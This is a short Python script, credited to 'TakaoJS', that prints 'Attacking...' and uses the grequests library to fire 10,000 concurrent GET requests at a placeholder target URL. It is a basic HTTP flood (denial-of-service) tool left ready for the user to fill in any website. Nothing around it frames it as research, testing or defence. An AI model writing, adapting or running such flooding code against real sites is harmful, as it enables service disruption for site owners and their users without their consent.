import grequests
import time

print('Created by TakaoJS#0404 | github: carameltora')
print('Attacking...')

start_time = time.time()
urls = ['your_website_url_here']*10000
rs = (grequests.get(u) for u in urls)
grequests.map(rs)

